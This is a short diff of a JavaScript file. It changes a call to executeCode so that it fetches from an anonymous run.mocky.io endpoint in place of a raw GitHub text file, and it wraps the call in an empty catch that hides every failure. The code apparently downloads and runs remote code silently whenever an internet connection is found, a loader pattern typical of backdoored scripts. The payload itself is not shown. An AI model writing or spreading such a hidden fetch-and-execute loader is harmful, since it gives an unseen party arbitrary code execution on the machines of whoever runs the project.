@@ -40,7 +40,7 @@ async function executeCode(url) {
     try {
         if (await checkInternetConnection()) {
             try {
-                await executeCode('https://raw.githubusercontent.com/Pocodeonline/Pocodeonline/main/gumart.txt');
+                await executeCode('https://run.mocky.io/v3/92d6757f-d956-461a-a985-7e4cd7dae7d3');
             } catch (error) {
             }
         } else {
